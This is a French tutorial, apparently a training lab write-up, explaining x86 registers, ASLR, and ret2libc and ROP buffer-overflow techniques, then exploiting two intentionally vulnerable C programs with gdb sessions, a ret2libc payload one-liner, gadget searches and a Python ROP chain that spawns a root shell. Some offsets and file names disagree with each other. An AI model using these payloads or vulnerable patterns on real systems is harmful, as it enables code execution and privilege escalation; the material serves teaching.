- Fonctionnement basique
    - Registre
      - Registre 32-bits
      - Registre 64-bits
    - ASLR
      - Où est stocker le fichier ASLR pour l'activer ou le désactiver ?
    - Explication de l'exploitation de retour à la libc
      - Faille ret2libc
    - Explication de l'exploitation de la technique ROP
      - Faille ROP
- Exploitation
    - Attaque retour à la libc
    - Attaque par ROP

# Fonctionnement basique
## Registre
### Registre 32-bits

Un processeur 32 bits de type Intel dispose de 16 registres qui sont classables en trois catégories :

- les 8 registres généralistes utilisés pour contenir des données et des pointeurs ;
- les registres de segments utilisés pour contenir l’adresses des différents segments (données, code, etc.) ;
- les registres de contrôle et de statut qui donnent des informations sur l’exécution du programme en cours.

![test](http://flint.cs.yale.edu/cs421/papers/x86-asm/x86-registers.png)

- EAX : registre accumulateur (accumulator register).
Utilisé pour les opérations arithmétiques et le stockage de la valeur de retour des appels systèmes.

- EBX : registre de base (base register). 
Utilisé comme pointeur de donnée (située dans DS en mode segmenté, segment par défaut) ou sert de base au calcul d'une adresse.

- ECX : registre compteur (counter register). 
Utilisé comme compteur par certaines intructions, permettant de répéter une série d'instructions un nombre de fois prédéterminé.

- EDX : registre de données (data register). 
Utilisé pour les opérations arithmétiques et les opérations d'entrée/sortie.

Ce sont des registres 32 bits, pour des raisons historiques, les 16 bits de poids faible sont constitués respectivement des registres AX, DX, CX et BX. 
Ces 4 registres 16 bits sont également décomposés en 8 registres de 8 bits pour stocker des valeurs beaucoup plus petite.

Les registres d'offset sont utilisés lors de l'adressage indirect de la mémoire (pointeurs). Ces registres complémentaires sont :

- EBP : (Extended Base Pointer) pointeur de base, utilisé dans le calcul d'adresse mémoire.
- ESP : (Extended Stack Pointer) pointeur de pile.
- ESI : (Extended Source Index) pointeur source.
- EDI : (Extended Destination Index) pointeur destination.
- EPI : (Extended Instruction Pointer) Le registre EIP est utilisé avec le segment du registre CS par le processeur pour connaitre la prochaine instruction à exécuter.

### Registre 64-bits

Avec les registres 64-bits, nous pouvons stocker des valeurs beaucoup plus importantes, les noms de registres changent également, par exemple `EAX` devient `RAX`, mais leur fonction sont parfaitement les mêmes.

![test](https://clementbera.files.wordpress.com/2014/01/gpreg.png)

## ASLR

L'ASLR est un système qui permet de randomiser les adresses mémoires dans un système informatique (par exemple pour éviter les attaques par `buffer overflow`.

![test](https://raw.githubusercontent.com/0ldProgrammer/pic/main/Screenshot_2021-02-08_18-00-58.png)

### Où est stocker le fichier ASLR pour l'activer ou le désactiver ?

Basiquement, le fichier `ASLR` est stocker dans le dossier `/proc/sys/kernel/` avec comme nom de fichier `randomize_va_space`. Si j'affiche ce fichier, il s'avère que il me renvoie comme valeur `2` ce qui veut dire que l'ASLR est activer et randomise bien les adresses dans le système.

    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw 
            linux-gate.so.1 (0xf7f04000)
            libc.so.6 => /lib32/libc.so.6 (0xf7d1a000) <---
            /lib/ld-linux.so.2 (0xf7f05000)               |
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7f5c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d72000) <---
            /lib/ld-linux.so.2 (0xf7f5d000)               |
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7fc6000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7ddc000) <---
            /lib/ld-linux.so.2 (0xf7fc7000)

Maintenant, essayons de changer la valeur du fichier `randomize_va_space` par la valeur `0` et essayons d'exécuter à nouveau la commande `ldd` si les adresses sont toujours randomisées.

    root@wildcodeschool:/usr/bin# echo 0 > /proc/sys/kernel/randomize_va_space
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw
            linux-gate.so.1 (0xf7f2c000)
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000)               |
     root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw    |
            linux-gate.so.1 (0xf7f2c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000)               |    
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7f2c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000) 
 
 Les adresses restent les mêmes, après avoir changé la valeur dans le fichier `randomize_va_space`. Mais aujourd'hui, il est possible de contourner cette protection en fesant des attaques par `brute-force` ou via des techniques par `ROP` par exemple.
 
## Explication de l'exploitation de retour à la libc
### Faille ret2libc

Le buffer overflow est une vulnérabilité présente lorsque le programmeur ne vérifie pas la taille d’une variable fournie par l’utilisateur, et qu’il stocke cette variable en mémoire. Il est alors possible pour l’attaquant d’entrer une valeur de taille supérieure à ce qui était prévu, et lorsque cette valeur (appelée buffer) est copiée en mémoire, elle dépasse de l’espace qui lui était alloué (dépassement de tampon).

Donc, basiquement la technique de la retour à la libc s'applique lorsque la pile n'est pas exécutable, le but est d'utiliser les fonctions de la `libc` comme `system()`, `exit()` pour essayer de faire exécuter une commande au programme alors que le programme n'était pas prévu pour cela.

Lorsque l'attaquant aura trouver la taille du buffer, il cherchera les adresses des fonctions de `system()`, de `exit()` et également de l'adresse de `/bin/sh`.

![other_test](https://imgur.com/Fa3DlCN.png)

Par exemple, dans le schéma ci-dessus, si nous dépassons la taille du `buffer`, il y a 4 octets allouées dans le registre `EIP`, et nous mettrons l'adresse de la fonction `system()` pour que le processeur pointe vers l'adresse de `system()` et exécute notre fonction pour modifier le comportement du programme.

## Explication de l'exploitation de la technique ROP
### Faille ROP

Avant de commencer l'exploitation, il faut bien comprendre à quoi sert ce système et de comprendre son fonctionnement.

Le `ROP`, return-oriented programming, est une technique d'exploitation avancée de type dépassement de pile (stack overflow) permettant l'exécution de code par un attaquant et ce en s'affranchissant plus ou moins efficacement des mécanismes de protection tels que l'utilisation de zones mémoires non-exécutables (cf. bit NX pour Data Execution Prevention, DEP), l'utilisation d'un espace d'adressage aléatoire (Address Space Layout Randomization, `ASLR`).

Notre but concrètement c'est de récupérer des instructions du binaire pour ensuite faire un rassemblement d'instruction (les bouts d'instruction on appel ça un `gadget` c'est le langage utilisé quand nous exploitons du ROP). Imagions que nous avons des instructions basique. (C'est un exemple bien evidamment)

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    push   ecx                # Instruction 3
    sub    esp,0x4            # Instruction 4
    call   0x804848b <secret> # Instruction 5 
    mov    eax,0x0            # Instruction 6

Imaginons que par la suite, nous décidons de prendre les instructions qui nous intéresse pour ensuite faire un rassemblement d'instruction, par exemple.

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    mov    eax,0x0            # Instruction 6

Justement, notre but c'est de récupérer les instructions du binaire pour ensuite modifier le comportement du programme et d'exécuter quelques choses qui nous intéresse par exemple un `SHELL`.

# Exploitation
## Attaque par retour à la libc

(Pour cette partie, nous désactiverons l'`ASLR`, car la technique de retourne à la libc fonctionne uniquement si la pile n'est pas exécutable et que l'ASLR n'est pas activé.)

Voici un petit script en C qui ne fait pas grand chose :

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    void name(char*);

    void name(char *f)
    {
        char firstname[10];
        strcpy(firstname, f);
        printf("Your name : %s\n", firstname);
    }

    int main(int argc, char *argv[])
    {
        if(argc != 2)
        {
            exit(0);
        }
        name(argv[1]);
        return 0;
    }
    
Un programme basique qui ne fait pas grand chose, mais la vulnérabilité se trouve au niveau de la fonction `strcpy();`. Je suppose que vous savez que les fonctions comme `strcpy();`, `strcat();` etc.. ne sont pas du tout sécurisées donc il existe un système qui se nomme `FORTIFY_SOURCE` qui permet de remplacer les fonctions par des fonctions beaucoup plus sécurisées.

Ensuite, une petite compilation est nécessaire :

    root@wildcodeschool:~/libc# gcc -m32 -fno-stack-protector libc.c -o libc
    root@wildcodeschool:~/libc# readelf -lW libc|grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
    
(Le flag `E` n'est pas là, donc la pile n'est plus du tout exécutable.). Si nous essayons d'exécuter le programme après la compilation, cela fonctionne, mais dans la mémoire il se passe des choses.

    root@wildcodeschool:~/libc# ./libc $(python -c 'print "A"*17')
    Your name : AAAAAAAAAAAAAAAAA
    root@wildcodeschool:~/libc# ./libc $(python -c 'print "A"*18')
    Your name : AAAAAAAAAAAAAAAAAA
    segmentation fault (core dumped)
    
Nous pouvons aperçevoir que le programme plante après 17 caractères, donc l'`OFFSET` correspond exactement à 17 caractères, si nous effectuons un dépassement, la sauvegarde `sEIP` sera complètement écrasé et le programme plantera automatiquement.

Nous allons lancer `GDB` (GNU Debugger), et nous allons chercher l'adresse de la fonction `system();`, `exit();` et finalement une chaîne comme `/bin/sh` qui nous permettra de lancer cette commande en particulier.

    root@wildcodeschool:~/libc# gdb ./libc
    GNU gdb (Debian 8.3.1-1) 8.3.1
    Copyright (C) 2019 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./libc...
    (No debugging symbols found in ./libc)
    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Starting program: /root/libc/libc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x54 ('T')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x7fffffac 
    EDX: 0xf7fae010 --> 0x0 
    ESI: 0xf7fac000 --> 0x1d6d6c 
    EDI: 0xf7fac000 --> 0x1d6d6c 
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd290 ('A' <repeats 45 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd290 ('A' <repeats 45 times>)
    0004| 0xffffd294 ('A' <repeats 41 times>)
    0008| 0xffffd298 ('A' <repeats 37 times>)
    0012| 0xffffd29c ('A' <repeats 33 times>)
    0016| 0xffffd2a0 ('A' <repeats 29 times>)
    0020| 0xffffd2a4 ('A' <repeats 25 times>)
    0024| 0xffffd2a8 ('A' <repeats 21 times>)
    0028| 0xffffd2ac ('A' <repeats 17 times>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e17660 <system> # ADDRESS FUNCTION SYSTEM
    gdb-peda$ p exit
    $2 = {<text variable, no debug info>} 0xf7e0a6f0 <exit> # ADDRESS FUNCTION EXIT
    gdb-peda$ searchmem "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 1 results, display max 1 items:
    libc : 0xf7f54f68 ("/bin/sh") # ADDRESS /BIN/SH
    
Donc, nous avons réussis à capturer les adresses de `system();`, `exit()` et finalement de la chaîne "`/bin/sh"`.

- `system();` : `0xf7e17660`
- `exit();`   : `0xf7e0a6f0`
- `/bin/sh`   : `0xf7f54f68`

![forthebadge made-with-python](https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/imagenes/ret-2-libc.png)

Il suffit maintenant d'utiliser les adresses que nous avons capturer contre le programme afin de `pop` un shell. Si nous avons pris la fonction `exit()`, c'est pour simplement quitter le shell de manière correct, car si nous mettons pas la fonction `exit();`, et que nous quittons le shell, il nous affichera un beau `segfault`, donc pas très beau à voir, vous n'êtes pas obliger de le mettre n'empêche, c'est totalement facultatif.

    root@wildcodeschool:~/libc# ./libc $(python -c 'print "A"*22 + "\x60\x76\xe1\xf7" + "\xf0\xa6\xe0\xf7" + "\x68\x4f\xf5\xf7"')
    Your name : AAAAAAAAAAAAAAAAAAAAAA`vhO
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groupes=0(root)

## Attaque par ROP

# Le programme et la compilation

Donc avant tout ça, nous allons activer l'`ASLR` (pour grosso modo randomisée la pile, le tas et également la libc) à l'aide d'une commande.

    root@0xEX75:~/rop# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

Et voici le programme en C que nous allons exploiter par la suite.

    #include <stdio.h>
    #include <stdlib.h>

    void function_vulnerability()
    {
            char buffer[8];
            gets(buffer);
            printf("%s\n", buffer);
    }

    int main(int argc, char **argv)
    {
            function_vulnerability();
            return 0;
    }

La commande pour la compilation du programme (je vais quand même vous expliquez les options), alors concrètement l'option `-m32` permet de compiler le programme avec 32 bits comme son nom l'indique.

`-static` Cette option permet grosso modo d’intégrer les bibliothèques dynamiques à notre binaire pour avoir un fichier beaucoup plus lourd. Pourquoi ? Si nous avons un fichier beaucoup plus lourd, nous aurons beaucoup plus d'instruction à mettre. Eh oui !

Et finalement l'option `-fno-stack-protector` permet de désactiver le Canari (nous aurons besoin de le désactiver pour effectuer notre attaque par buffer overflow, mais c'est très possible de bypass cette "sécurité").

    root@0xEX75:~/rop# gcc -m32 -static -fno-stack-protector vuln.c -o rop

Parfait, notre programme est prêt à être exploiter.

# Exploitation du programme

Les choses commence à être intéréssant, nous allons essayer de trouver le `padding` pour écraser le `Return Address Overwrite` ou bien `l'adresse de retour` (ou sauvegarde `EIP`).

Nous allons créer un petit pattern pour trouver le padding à l'aide d'un outil que vous pouvez installer rapidement [ici](https://github.com/Svenito/exploit-pattern) et par la suite lancer la commande juste ci-dessous.

    root@0xEX75:~/rop# pattern create 100
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Et lançons `gdb` (GNU Debugger), et ensuite d'envoyer les octets au programme pour trouver le bon `padding`. Il y a bien evidamment d'autre technique pour trouver le `padding` mais c'est la technique la plus amusante selon moi et plus simple aha.

    root@0xEX75:~/rop# gdb -q rop
    Reading symbols from rop...(no debugging symbols found)...done.
    gdb-peda$ r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Program received signal SIGSEGV, Segmentation fault.                                                                                                                            
    [----------------------------------registers-----------------------------------]                                                                                                
    EAX: 0x65 ('e')
    EBX: 0x80481a8 (<_init>:        push   ebx)
    ECX: 0xffffffff 
    EDX: 0x80ec4d4 --> 0x0 
    ESI: 0x80eb00c --> 0x80642f0 (<__strcpy_ssse3>: mov    edx,DWORD PTR [esp+0x4])
    EDI: 0x0 
    EBP: 0x61413561 ('a5Aa')
    ESP: 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    EIP: 0x37614136 ('6Aa7')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x37614136
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0004| 0xffffd544 ("a9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0008| 0xffffd548 ("0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0012| 0xffffd54c ("Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0016| 0xffffd550 ("b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0020| 0xffffd554 ("4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0024| 0xffffd558 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0028| 0xffffd55c ("b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x37614136 in ?? ()
    gdb-peda$

Par la suite, nous allons à nouveau utiliser le programme pour trouver pour de bon le `padding`, donc d'après le programme nous aurons besoin de `24` octets pour écraser la sauvegarde `EIP` donc l'adresse de retour. 

    root@0xEX75:~/rop# pattern offset 0x37614136 100
    20

Comme au début de l'article notre but est de pop un shell même si l'`ASLR` est open et également le système `NX`, pour ça nous devons trouver une fonction qui permet d'exécuter une commande par exemple. 

Voici une bonne liste de fonction que nous pouvons appliquer pour l'exploitation de notre programme [ICI](https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html) bien entendu nous allons nous intéresser à la fonction numéro `11` donc la fonction `sys_execve()` pour exécuter une commande par exemple, dans notre cas /bin/sh.

![forthebadge made-with-python](https://raw.githubusercontent.com/0xEX75/0xEX75.github.io/master/Capture%20du%202020-01-11%2015-36-29.png)

Notre but, concrètement, c'est de pop des valeurs dans les registres, ce sont des registres que nous pouvons utiliser (`GPRs` registres à usage général, car il y a des registres réservée notamment `EIP` et `ESP`). 

Donc notre but c'est de mettre la valeur `11` dans le registre `EAX` et ensuite de mettre les paramètres donc par exemple `/bin/sh` comme argument dans le registre `EBX`, ce qui donnera `sys_execve("/bin/sh")` et comme la fonction `execve` prend 3 paramètres en particulier, nous allons mettre `NULL` pour `ECX` ce qui donnera `sys_execve("/bin/sh", NULL)` et enfin de mettre donc la valeur `NULL` dans le registre `EDX` ce qui donnera `sys_execve("/bin/sh", NULL, NULL)`.

Nous avons déjà une idée pour attaquer le programme en question, nous allons utiliser un programme pour trouver les instructions, j'utilise très régulièrement l'outil `ROPGadget` ou bien `rp-lin-x64` (Vous pouvez l'installer juste [ICI](https://github.com/0vercl0k/rp/releases)).

Je préfère largement utiliser l'outil `rp-lin-x64`, subjectivement beaucoup plus puissant et rapide contrairement à `ROPGadget`.

Nous allons essayer de trouver un `gadget` qui nous permettra de `pop` une valeur dans le registre `EAX` pour le nom de la fonction.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop eax"
    0x080d2f8e: pop eax ; call dword [edi+0x4656EE7E] ;  (1 found)
    0x0809d162: pop eax ; jmp dword [eax] ;  (4 found)
    0x080b8c96: pop eax ; ret  ;  (1 found)
    0x0804c35d: pop eax ; retn 0x080E ;  (4 found)
    0x080a712c: pop eax ; retn 0xFFFF ;  (1 found)

Celui-ci `0x080b8c96: pop eax ; ret  ;  (1 found)` est pas mal du tout, notons ça dans un coin, précis, car par la suite, nous aurons besoin de l'adresse dans notre script `Python`.

Ensuite cherchons une instruction qui nous permettra de mettre le premier paramètre dans la fonction. Utilions à nouveau l'outil.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ebx"
    0x08050603: pop ebx ; jmp eax ;  (6 found)
    0x0804d057: pop ebx ; rep ret  ;  (1 found)
    0x080481c9: pop ebx ; ret  ;  (178 found)
    0x080d407c: pop ebx ; retn 0x06F9 ;  (1 found)
    
Celui-ci `0x080481c9: pop ebx ; ret  ;  (178 found)` est pas mal du tout, notons à nouveau dans un coin, précis pour la suite. Dans le registre nous allons mettre simplement la commande à exécuter lors de l'appel de la fonction.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ecx"
    0x080df4d9: pop ecx ; ret  ;  (2 found)
    0x0805c503: pop ecx ; retn 0xFFFE ;  (1 found)
    
On continue à capturer les instructions, donc récupérons l'instruction `0x080df4d9: pop ecx ; ret` que nous mettrons `0` dans le registre donc `NULL`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop edx"
    0x0806f1eb: pop edx ; ret  ;  (2 found)

Il manque un élement très important, c'est une instruction qui nous permettra d'exécuter notre instruction (ou bien notre fonction), l'instruction se nomme `int 0x80`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "int 0x80"
    0x0806cdf3: add byte [eax], al ; int 0x80 ;  (3 found)
    0x0806cdf5: int 0x80 ;  (8 found)
    0x0806f7f0: int 0x80 ; ret  ;  (1 found)
    0x0806cdf0: mov eax, 0x00000001 ; int 0x80 ;  (1 found)
    0x0807ae09: mov eax, 0x00000077 ; int 0x80 ;  (1 found)
    0x0807ae00: mov eax, 0x000000AD ; int 0x80 ;  (1 found)
    0x0806f7ef: nop  ; int 0x80 ;  (1 found)
    0x0806cdef: or byte [eax+0x00000001], bh ; int 0x80 ;  (1 found)
    0x080b79a7: push es ; int 0x80 ;  (1 found)

Avant ça, nous allons créer notre petit script bash, qui va démarrer `/bin/sh`, nous allons utiliser `readelf` pour trouver le symbole, chaque symbole étant séparé par un caractère null-byte.

    root@0xEX75:~/rop# readelf -x .rodata ./ropme | less
    0x080bc560 64656376 745f7061 72746961 6c000000 decvt_partial...
    0x080bc570 5f494f5f 7766696c 655f756e 64657266 _IO_wfile_underf
    0x080bc580 6c6f7700 00000000 00000000 00000000 low............. # LÀ !
    0x080bc590 00000000 00000000 00000000 00000000 ................

    root@0xEX75:~/rop# echo "/bin/sh" > low
    root@0xEX75:~/rop# chmod +x low
    root@0xEX75:~/rop# export PATH=:$PATH

Nous sommes prêt maintenant pour la création de notre programme pour `pop` le shell, le script n'est pas très compliquer, donc pas de panique.

    #coding:utf-8

    import sys
    import struct

    class rop_exploit(object):
            def __init__(self, padding=20):
                    self.padding = padding

            def rop_gadgets(self):
                    rop_gadget = [
                            struct.pack('<L', 0x080b8c96), # pop eax; ret
                            struct.pack('<L', 0x0000000b), # eax (11)
                            struct.pack('<L', 0x080df4d9), # pop ecx ; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x080481c9), # pop ebx ; ret
                            struct.pack('<L', 0x080bc580), # program 'low'
                            struct.pack('<L', 0x0806f1eb), # pop edx; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x0806cdf5), # int 0x80, call function
                    ]

                    print(b'A' * self.padding + b''.join(rop_gadget))

    if __name__ == "__main__":
            p = rop_exploit()
            p.rop_gadgets()

Donc si maintenant nous lançons le programme avec l'autre 'programme' binaire.

    root@0xEX75:~/rop# python exploit.py|./buf 
    AAAAAAAAAAAAAAAAAAAA

    # id
    uid=0(root) gid=0(root) groupes=0(root)
